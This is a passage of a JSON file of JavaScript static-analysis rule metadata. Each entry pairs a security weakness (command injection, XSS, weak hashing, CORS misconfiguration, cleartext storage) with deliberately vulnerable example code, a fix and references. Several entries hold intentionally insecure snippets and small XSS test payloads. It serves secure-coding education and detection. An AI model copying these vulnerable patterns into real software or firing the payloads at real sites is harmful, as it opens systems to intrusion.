res.redirect(url);\n    }\n});\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/sensitive-get-query": {
    "name": "Sensitive data read from GET request",
    "description": "Placing sensitive data in a GET request increases the risk of the data being exposed to an attacker.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "precision": "high",
    "id": "js/sensitive-get-query",
    "tags": [
      "security",
      "external/cwe/cwe-598"
    ],
    "filename": "17740e07-SensitiveGetQuery",
    "language": "javascript",
    "help": "# Sensitive data read from GET request\nSensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.\n\n\n## Recommendation\nUse HTTP POST to send sensitive information as part of the request body; for example, as form data.\n\n\n## Example\nThe following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.\n\n\n```javascript\nconst express = require('express');\nconst app = express();\napp.use(require('body-parser').urlencoded({ extended: false }))\n\n// bad: sensitive information is read from query parameters\napp.get('/login1', (req, res) => {\n    const user = req.query.user;\n    const password = req.query.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n// good: sensitive information is read from post body\napp.post('/login2', (req, res) => {\n    const user = req.body.user;\n    const password = req.body.password;\n    if (checkUser(user, password)) {\n        res.send('Welcome');\n    } else {\n        res.send('Access denied');\n    }\n});\n\n```\n\n## References\n* CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)\n* PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)\n* OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)\n* Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).\n"
  },
  "js/clear-text-storage-of-sensitive-data": {
    "name": "Clear text storage of sensitive information",
    "description": "Sensitive information stored without encryption or hashing can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/clear-text-storage-of-sensitive-data",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-315",
      "external/cwe/cwe-359"
    ],
    "filename": "1b3d24d7-CleartextStorage",
    "language": "javascript",
    "help": "# Clear text storage of sensitive information\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage. This is particularly important for cookies, which are stored on the machine of the end-user.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored. If possible, avoid placing sensitive information in cookies altogether. Instead, prefer storing, in the cookie, a key that can be used to look up the sensitive information.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the `standard out` and `standard error` streams of the application, causing logged sensitive information to be stored as well.\n\n\n## Example\nThe following example code stores user credentials (in this case, their password) in a cookie in plain text:\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\napp.get('/remember-password', function (req, res) {\n  let pw = req.param(\"current_password\");\n  // BAD: Setting a cookie value with cleartext sensitive data.\n  res.cookie(\"password\", pw);\n});\n\n```\nInstead, the credentials should be encrypted, for instance by using the Node.js `crypto` module:\n\n\n```javascript\nvar express = require('express');\nvar crypto = require('crypto'),\n    password = getPassword();\n\nfunction encrypt(text){\n  var cipher = crypto.createCipher('aes-256-ctr', password);\n  return cipher.update(text, 'utf8', 'hex') + cipher.final('hex');\n}\n\nvar app = express();\napp.get('/remember-password', function (req, res) {\n  let pw = req.param(\"current_password\");\n  // GOOD: Encoding the value before setting it.\n  res.cookie(\"password\", encrypt(pw));\n});\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-315](https://cwe.mitre.org/data/definitions/315.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n"
  },
  "js/double-escaping": {
    "name": "Double escaping or unescaping",
    "description": "When escaping special characters using a meta-character like backslash or ampersand, the meta-character has to be escaped first to avoid double-escaping, and conversely it has to be unescaped last to avoid double-unescaping.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "js/double-escaping",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-116",
      "external/cwe/cwe-020"
    ],
    "filename": "557f3ed7-DoubleEscaping",
    "language": "javascript",
    "help": "# Double escaping or unescaping\nEscaping meta-characters in untrusted input is an important technique for preventing injection attacks such as cross-site scripting. One particular example of this is HTML entity encoding, where HTML special characters are replaced by HTML character entities to prevent them from being interpreted as HTML markup. For example, the less-than character is encoded as `&lt;` and the double-quote character as `&quot;`. Other examples include backslash-escaping for including untrusted data in string literals and percent-encoding for URI components.\n\nThe reverse process of replacing escape sequences with the characters they represent is known as unescaping.\n\nNote that the escape characters themselves (such as ampersand in the case of HTML encoding) play a special role during escaping and unescaping: they are themselves escaped, but also form part of the escaped representations of other characters. Hence care must be taken to avoid double escaping and unescaping: when escaping, the escape character must be escaped first, when unescaping it has to be unescaped last.\n\nIf used in the context of sanitization, double unescaping may render the sanitization ineffective. Even if it is not used in a security-critical context, it may still result in confusing or garbled output.\n\n\n## Recommendation\nUse a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation. For URI encoding, you can use the standard `encodeURIComponent` and `decodeURIComponent` functions.\n\nOtherwise, make sure to always escape the escape character first, and unescape it last.\n\n\n## Example\nThe following example shows a pair of hand-written HTML encoding and decoding functions:\n\n\n```javascript\nmodule.exports.encode = function(s) {\n  return s.replace(/&/g, \"&amp;\")\n          .replace(/\"/g, \"&quot;\")\n          .replace(/'/g, \"&apos;\");\n};\n\nmodule.exports.decode = function(s) {\n  return s.replace(/&amp;/g, \"&\")\n          .replace(/&quot;/g, \"\\\"\")\n          .replace(/&apos;/g, \"'\");\n};\n\n```\nThe encoding function correctly handles ampersand before the other characters. For example, the string `me & \"you\"` is encoded as `me &amp; &quot;you&quot;`, and the string `&quot;` is encoded as `&amp;quot;`.\n\nThe decoding function, however, incorrectly decodes `&amp;` into `&` before handling the other characters. So while it correctly decodes the first example above, it decodes the second example (`&amp;quot;`) to `\"` (a single double quote), which is not correct.\n\nInstead, the decoding function should decode the ampersand last:\n\n\n```javascript\nmodule.exports.encode = function(s) {\n  return s.replace(/&/g, \"&amp;\")\n          .replace(/\"/g, \"&quot;\")\n          .replace(/'/g, \"&apos;\");\n};\n\nmodule.exports.decode = function(s) {\n  return s.replace(/&quot;/g, \"\\\"\")\n          .replace(/&apos;/g, \"'\")\n          .replace(/&amp;/g, \"&\");\n};\n\n```\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* npm: [html-entities](https://www.npmjs.com/package/html-entities) package.\n* npm: [js-string-escape](https://www.npmjs.com/package/js-string-escape) package.\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/insufficient-password-hash": {
    "name": "Use of password hash with insufficient computational effort",
    "description": "Creating a hash of a password with low computational effort makes the hash vulnerable to password cracking attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "high",
    "id": "js/insufficient-password-hash",
    "tags": [
      "security",
      "external/cwe/cwe-916"
    ],
    "filename": "1910471b-InsufficientPasswordHash",
    "language": "javascript",
    "help": "# Use of password hash with insufficient computational effort\nStoring cryptographic hashes of passwords is standard security practice, but it is equally important to select the right hashing scheme. If an attacker obtains the hashed passwords of an application, the password hashing scheme should still prevent the attacker from easily obtaining the original cleartext passwords.\n\nA good password hashing scheme requires a computation that cannot be done efficiently. Standard hashing schemes, such as `md5` or `sha1`, are efficiently computable, and are therefore not suitable for password hashing.\n\n\n## Recommendation\nUse a secure password hashing scheme such as `bcrypt`, `scrypt`, `PBKDF2`, or `Argon2`.\n\n\n## Example\nIn the example below, the `md5` algorithm computes the hash of a password.\n\n\n```javascript\nconst crypto = require(\"crypto\");\nfunction hashPassword(password) {\n    var hasher = crypto.createHash('md5');\n    var hashed = hasher.update(password).digest(\"hex\"); // BAD\n    return hashed;\n}\n\n```\nThis is not secure, since the password can be efficiently cracked by an attacker that obtains the hash. A more secure scheme is to hash the password with the `bcrypt` algorithm:\n\n\n```javascript\nconst bcrypt = require(\"bcrypt\");\nfunction hashPassword(password, salt) {\n  var hashed = bcrypt.hashSync(password, salt); // GOOD\n  return hashed;\n}\n\n```\n\n## References\n* OWASP: [Password storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n"
  },
  "js/second-order-command-line-injection": {
    "name": "Second order command injection",
    "description": "Using user-controlled data as arguments to some commands, such as git clone, can allow arbitrary commands to be executed.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.0,
    "precision": "high",
    "id": "js/second-order-command-line-injection",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088"
    ],
    "filename": "5ab6110a-SecondOrderCommandInjection",
    "language": "javascript",
    "help": "# Second order command injection\nSome shell commands, like `git ls-remote`, can execute arbitrary commands if a user provides a malicious URL that starts with `--upload-pack`. This can be used to execute arbitrary code on the server.\n\n\n## Recommendation\nSanitize user input before passing it to the shell command. For example, ensure that URLs are valid and do not contain malicious commands.\n\n\n## Example\nThe following example shows code that executes `git ls-remote` on a URL that can be controlled by a malicious user.\n\n\n```javascript\nconst express = require(\"express\");\nconst app = express();\n\nconst cp = require(\"child_process\");\n\napp.get(\"/ls-remote\", (req, res) => {\n  const remote = req.query.remote;\n  cp.execFile(\"git\", [\"ls-remote\", remote]); // NOT OK\n});\n\n```\nThe problem has been fixed in the snippet below, where the URL is validated before being passed to the shell command.\n\n\n```javascript\nconst express = require(\"express\");\nconst app = express();\n\nconst cp = require(\"child_process\");\n\napp.get(\"/ls-remote\", (req, res) => {\n  const remote = req.query.remote;\n  if (!(remote.startsWith(\"git@\") || remote.startsWith(\"https://\"))) {\n    throw new Error(\"Invalid remote: \" + remote);\n  }\n  cp.execFile(\"git\", [\"ls-remote\", remote]); // OK\n});\n\n```\n\n## References\n* Max Justicz: [Hacking 3,000,000 apps at once through CocoaPods](https://justi.cz/security/2021/04/20/cocoapods-rce.html).\n* Git: [Git - git-ls-remote Documentation](https://git-scm.com/docs/git-ls-remote/2.22.0#Documentation/git-ls-remote.txt---upload-packltexecgt).\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n"
  },
  "js/missing-x-frame-options": {
    "name": "Missing X-Frame-Options HTTP header",
    "description": "If the 'X-Frame-Options' setting is not provided, a malicious user may be able to overlay their own UI on top of the site by using an iframe.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "low",
    "id": "js/missing-x-frame-options",
    "tags": [
      "security",
      "external/cwe/cwe-451",
      "external/cwe/cwe-829"
    ],
    "filename": "09458809-MissingXFrameOptions",
    "language": "javascript",
    "help": "# Missing X-Frame-Options HTTP header\nWebsites that do not specify the `X-Frame-Options` HTTP header may be vulnerable to UI redress attacks (\"clickjacking\"). In these attacks, the vulnerable site is loaded in a frame on an attacker-controlled site which uses opaque or transparent layers to trick the user into unintentionally clicking a button or link on the vulnerable site.\n\n\n## Recommendation\nSet the `X-Frame-Options` HTTP header to `DENY`, to instruct web browsers to block attempts to load the site in a frame. Alternatively, if framing is needed in certain circumstances, specify `SAMEORIGIN` or `ALLOW FROM: ...` to limit the ability to frame the site to pages from the same origin, or from an allowed whitelist of trusted domains.\n\nFor [express](https://www.npmjs.com/package/express) applications, the header may be specified by setting `res.setHeader('X-Frame-Options', 'DENY')` on each request. Several npm modules provide this functionality as well: [frameguard](https://www.npmjs.com/package/frameguard), [helmet](https://www.npmjs.com/package/helmet), [x-frame-options](https://www.npmjs.com/package/x-frame-options)\n\nAlternatively, the header can be set by a proxy. As an example, a [HAProxy](http://www.haproxy.org/) configuration should contain: `rspadd X-Frame-Options:\\ DENY` to set the header automatically.\n\n\n## Example\nThe following example shows an [express](https://www.npmjs.com/package/express) application that does *not* set the `X-Frame-Options` header on its responses:\n\n\n```javascript\nvar express = require('express'),\n    app = express();\n\n\napp.get('/', function (req, res) {\n    res.send('X-Frame-Options: ' + res.get('X-Frame-Options'))\n})\n\n```\nThe application can be made safer by setting the `X-Frame-Options` header before responding:\n\n\n```javascript\nvar express = require('express'),\n    app = express();\n\n\napp.get('/', function (req, res) {\n    res.set('X-Frame-Options', value)\n    res.send('X-Frame-Options: ' + res.get('X-Frame-Options'))\n})\n\n```\n\n## References\n* OWASP: [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).\n* Mozilla: [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)\n* Common Weakness Enumeration: [CWE-451](https://cwe.mitre.org/data/definitions/451.html).\n* Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).\n"
  },
  "js/unsafe-html-expansion": {
    "name": "Unsafe expansion of self-closing HTML tag",
    "description": "Using regular expressions to expand self-closing HTML tags may lead to cross-site scripting vulnerabilities.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "very-high",
    "id": "js/unsafe-html-expansion",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "557f3ed7-UnsafeHtmlExpansion",
    "language": "javascript",
    "help": "# Unsafe expansion of self-closing HTML tag\nSanitizing untrusted input for HTML meta-characters is a common technique for preventing cross-site scripting attacks. But even a sanitized input can be dangerous to use if it is modified further before a browser treats it as HTML. A seemingly innocent transformation that expands a self-closing HTML tag from `<div attr=\"{sanitized}\"/>` to `<div attr=\"{sanitized}\"></div>` may in fact cause cross-site scripting vulnerabilities.\n\n\n## Recommendation\nUse a well-tested sanitization library if at all possible, and avoid modifying sanitized values further before treating them as HTML.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using HTML templates that are explicit about the values they treat as HTML.\n\n\n## Example\nThe following function transforms a self-closing HTML tag to a pair of open/close tags. It does so for all non-`img` and non-`area` tags, by using a regular expression with two capture groups. The first capture group corresponds to the name of the tag, and the second capture group to the content of the tag.\n\n\n```javascript\nfunction expandSelfClosingTags(html) {\n\tvar rxhtmlTag = /<(?!img|area)(([a-z][^\\w\\/>]*)[^>]*)\\/>/gi;\n\treturn html.replace(rxhtmlTag, \"<$1></$2>\"); // BAD\n}\n\n```\nWhile it is generally known regular expressions are ill-suited for parsing HTML, variants of this particular transformation pattern have long been considered safe.\n\nHowever, the function is not safe. As an example, consider the following string:\n\n\n```html\n<div alt=\"\n<x\" title=\"/>\n<img src=url404 onerror=alert(1)>\"/>\n\n```\nWhen the above function transforms the string, it becomes a string that results in an alert when a browser treats it as HTML.\n\n\n```html\n<div alt=\"\n<x\" title=\"></x\" >\n<img src=url404 onerror=alert(1)>\"/>\n\n```\n\n## References\n* jQuery: [Security fixes in jQuery 3.5.0](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/cors-misconfiguration": {
    "name": "overly CORS configuration",
    "description": "Misconfiguration of CORS HTTP headers allows CSRF attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/cors-misconfiguration",
    "tags": [
      "security",
      "external/cwe/cwe-942"
    ],
    "filename": "80c015a5-CorsPermissiveConfiguration",
    "language": "javascript",
    "help": "# overly CORS configuration\nA server can use `CORS` (Cross-Origin Resource Sharing) to relax the restrictions imposed by the `SOP` (Same-Origin Policy), allowing controlled, secure cross-origin requests when necessary. A server with an overly permissive `CORS` configuration may inadvertently expose sensitive data or lead to `CSRF` which is an attack that allows attackers to trick users into performing unwanted operations in websites they're authenticated to.\n\n\n## Recommendation\nWhen the `origin` is set to `true`, it signifies that the server is accepting requests from `any` origin, potentially exposing the system to CSRF attacks. This can be fixed using `false` as origin value or using a whitelist.\n\nOn the other hand, if the `origin` is set to `null`, it can be exploited by an attacker to deceive a user into making requests from a `null` origin form, often hosted within a sandboxed iframe.\n\nIf the `origin` value is user controlled, make sure that the data is properly sanitized.\n\n\n## Example\nIn the example below, the `server_1` accepts requests from any origin since the value of `origin` is set to `true`. And `server_2`'s origin is user-controlled.\n\n\n```javascript\nimport { ApolloServer } from 'apollo-server';\nvar https = require('https'),\n    url = require('url');\n\nvar server = https.createServer(function () { });\n\nserver.on('request', function (req, res) {\n    // BAD: origin is too permissive\n    const server_1 = new ApolloServer({\n        cors: { origin: true }\n    });\n\n    let user_origin = url.parse(req.url, true).query.origin;\n    // BAD: CORS is controlled by user\n    const server_2 = new ApolloServer({\n        cors: { origin: user_origin }\n    });\n});\n```\nIn the example below, the `server_1` CORS is restrictive so it's not vulnerable to CSRF attacks. And `server_2`'s is using properly sanitized user-controlled data.\n\n\n```javascript\nimport { ApolloServer } from 'apollo-server';\nvar https = require('https'),\n    url = require('url');\n\nvar server = https.createServer(function () { });\n\nserver.on('request', function (req, res) {\n    // GOOD: origin is restrictive\n    const server_1 = new ApolloServer({\n        cors: { origin: false }\n    });\n\n    let user_origin = url.parse(req.url, true).query.origin;\n    // GOOD: user data is properly sanitized\n    const server_2 = new ApolloServer({\n        cors: { origin: (user_origin === \"https://allowed1.com\" || user_origin === \"https://allowed2.com\") ? user_origin : false }\n    });\n});\n```\n\n## References\n* Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).\n* W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)\n* Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).\n"
  },
  "js/server-crash": {
    "name": "Server crash",
    "description": "A server that can be forced to crash may be vulnerable to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/server-crash",
    "tags": [
      "security",
      "external/cwe/cwe-248",
      "external/cwe/cwe-730"
    ],
    "filename": "d4b8aaad-ServerCrash",
    "language": "javascript",
    "help": "# Server crash\nServers handle requests from clients until terminated deliberately by a server administrator. A client request that results in an uncaught server-side exception causes the current server response generation to fail, and should not have an effect on subsequent client requests.\n\nUnder some circumstances, uncaught exceptions can however cause the entire server to terminate abruptly. Such a behavior is highly undesirable, especially if it gives malicious users the ability to turn off the server at will, which is an efficient denial-of-service attack.\n\n\n## Recommendation\nEnsure that the processing of client requests can not cause uncaught exceptions to terminate the entire server abruptly.\n\n\n## Example\nThe following server code checks if a client-provided file path is valid before saving data to that path. It would be reasonable to expect that the server responds with an error in case the request contains an invalid file path. However, the server instead throws an exception, which is uncaught in the context of the asynchronous callback invocation (`fs.access(...)`). This causes the entire server to terminate abruptly.\n\n\n```javascript\nconst express = require(\"express\"),\n  fs = require(\"fs\");\n\nfunction save(rootDir, path, content) {\n  if (!isValidPath(rootDir, req.query.filePath)) {\n    throw new Error(`Invalid filePath: ${req.query.filePath}`); // BAD crashes the server\n  }\n  // write content to disk\n}\n\nexpress().post(\"/save\", (req, res) => {\n  fs.access(rootDir, (err) => {\n    if (err) {\n      console.error(\n        `Server setup is corrupted, ${rootDir} cannot be accessed!`\n      );\n      res.status(500);\n      res.end();\n      return;\n    }\n    save(rootDir, req.query.path, req.body);\n    res.status(200);\n    res.end();\n  });\n});\n\n```\nTo remedy this, the server can catch the exception explicitly with a `try/catch` block, and generate an appropriate error response instead:\n\n\n```javascript\n// ...\nexpress().post(\"/save\", (req, res) => {\n  fs.access(rootDir, (err) => {\n    // ...\n    try {\n      save(rootDir, req.query.path, req.body); // GOOD exception is caught below\n      res.status(200);\n      res.end();\n    } catch (e) {\n      res.status(500);\n      res.end();\n    }\n  });\n});\n\n```\nTo simplify exception handling, it may be advisable to switch to async/await syntax instead of using callbacks, which allows wrapping the entire request handler in a `try/catch` block:\n\n\n```javascript\n// ...\nexpress().post(\"/save\", async (req, res) => {\n  try {\n    await fs.promises.access(rootDir);\n    save(rootDir, req.query.path, req.body); // GOOD exception is caught below\n    res.status(200);\n    res.end();\n  } catch (e) {\n    res.status(500);\n    res.end();\n  }\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-248](https://cwe.mitre.org/data/definitions/248.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n"
  },
  "js/case-sensitive-middleware-path": {
    "name": "Case-sensitive middleware path",
    "description": "Middleware with case-sensitive paths do not protect endpoints with case-insensitive paths.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.3,
    "precision": "high",
    "id": "js/case-sensitive-middleware-path",
    "tags": [
      "security",
      "external/cwe/cwe-178"
    ],
    "filename": "20998ed0-CaseSensitiveMiddlewarePath",
    "language": "javascript",
    "help": "# Case-sensitive middleware path\nUsing a case-sensitive regular expression path in a middleware route enables an attacker to bypass that middleware when accessing an endpoint with a case-insensitive path. Paths specified using a string are case-insensitive, whereas regular expressions are case-sensitive by default.\n\n\n## Recommendation\nWhen using a regular expression as a middleware path, make sure the regular expression is case-insensitive by adding the `i` flag.\n\n\n## Example\nThe following example restricts access to paths in the `/admin` path to users logged in as administrators:\n\n\n```javascript\nconst app = require('express')();\n\napp.use(/\\/admin\\/.*/, (req, res, next) => {\n    if (!req.user.isAdmin) {\n        res.status(401).send('Unauthorized');\n    } else {\n        next();\n    }\n});\n\napp.get('/admin/users/:id', (req, res) => {\n    res.send(app.database.users[req.params.id]);\n});\n\n```\nA path such as `/admin/users/45` can only be accessed by an administrator. However, the path `/ADMIN/USERS/45` can be accessed by anyone because the upper-case path doesn't match the case-sensitive regular expression, whereas Express considers it to match the path string `/admin/users`.\n\nThe issue can be fixed by adding the `i` flag to the regular expression:\n\n\n```javascript\nconst app = require('express')();\n\napp.use(/\\/admin\\/.*/i, (req, res, next) => {\n    if (!req.user.isAdmin) {\n        res.status(401).send('Unauthorized');\n    } else {\n        next();\n    }\n});\n\napp.get('/admin/users/:id', (req, res) => {\n    res.send(app.database.users[req.params.id]);\n});\n\n```\n\n## References\n* MDN [Regular Expression Flags](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#advanced_searching_with_flags).\n* Common Weakness Enumeration: [CWE-178](https://cwe.mitre.org/data/definitions/178.html).\n"
  },
  "js/xss-through-exception": {
    "name": "Exception text reinterpreted as HTML",
    "description": "Reinterpreting text from an exception as HTML can lead to a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/xss-through-exception",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "bc37419c-ExceptionXss",
    "language": "javascript",
    "help": "# Exception text reinterpreted as HTML\nDirectly writing error messages to a webpage without sanitization allows for a cross-site scripting vulnerability if parts of the error message can be influenced by a user.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example shows an exception being written directly to the document, and this exception can potentially be influenced by the page URL, leaving the website vulnerable to cross-site scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\")+8);\n    \n    try {\n        var parsed = unknownParseFunction(deflt); \n    } catch(e) {\n        document.write(\"Had an error: \" + e + \".\");\n    }\n}\n\n```\n\n## Example\nThis second example shows an input being validated using the JSON schema validator `ajv`, and in case of an error, the error message is sent directly back in the response.\n\n\n```javascript\nimport express from 'express';\nimport Ajv from 'ajv';\n\nlet app = express();\nlet ajv = new Ajv();\n\najv.addSchema({type: 'object', additionalProperties: {type: 'number'}}, 'pollData');\n\napp.post('/polldata', (req, res) => {\n    if (!ajv.validate('pollData', req.body)) {\n        res.send(ajv.errorsText());\n    }\n});\n\n```\nThis is unsafe, because the error message can contain parts of the input. For example, the input `{'<img src=x onerror=alert(1)>': 'foo'}` will generate the error `data/<img src=x onerror=alert(1)> should be number`, causing reflected XSS.\n\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "js/overly-large-range": {
    "name": "Overly permissive regular expression range",
    "description": "Overly permissive regular expression ranges match a wider range of characters than intended. This may allow an attacker to bypass a filter or sanitizer.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "high",
    "id": "js/overly-large-range",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "bc247e13-OverlyLargeRange",
    "language": "javascript",
    "help": "# Overly permissive regular expression range\nIt's easy to write a regular expression range that matches a wider range of characters than you intended. For example, `/[a-zA-z]/` matches all lowercase and all uppercase letters, as you would expect, but it also matches the characters: `` [ \\ ] ^ _ ` ``.\n\nAnother common problem is failing to escape the dash character in a regular expression. An unescaped dash is interpreted as part of a range. For example, in the character class `[a-zA-Z0-9%=.,-_]` the last character range matches the 55 characters between `,` and `_` (both included), which overlaps with the range `[0-9]` and is clearly not intended by the writer.\n\n\n## Recommendation\nAvoid any confusion about which characters are included in the range by writing unambiguous regular expressions. Always check that character ranges match only the expected characters.\n\n\n## Example\nThe following example code is intended to check whether a string is a valid 6 digit hex color.\n\n```javascript\n\nfunction isValidHexColor(color) {\n    return /^#[0-9a-fA-f]{6}$/i.test(color);\n}\n\n```\nHowever, the `A-f` range is overly large and matches every uppercase character. It would parse a \"color\" like `#XXYYZZ` as valid.\n\nThe fix is to use an uppercase `A-F` range instead.\n\n```javascript\n\nfunction isValidHexColor(color) {\n    return /^#[0-9A-F]{6}$/i.test(color);\n}\n\n```\n\n## References\n* GitHub Advisory Database: [CVE-2021-42740: Improper Neutralization of Special Elements used in a Command in Shell-quote](https://github.com/advisories/GHSA-g4rg-993r-mgx7)\n* wh0.github.io: [Exploiting CVE-2021-42740](https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html)\n* Yosuke Ota: [no-obscure-range](https://ota-meshi.github.io/eslint-plugin-regexp/rules/no-obscure-range.html)\n* Paul Boyd: [The regex \\[,-.\\]](https://pboyd.io/posts/comma-dash-dot/)\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/insecure-http-parser": {
    "name": "Insecure http parser",
    "description": "Using an insecure http parser can lead to http smuggling attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 9.0,
    "precision": "high",
    "id": "js/insecure-http-parser",
    "tags": [
      "security",
      "external/cwe/cwe-444"
    ],
    "filename": "e6ec33c7-InsecureHttpParser",
    "language": "javascript",
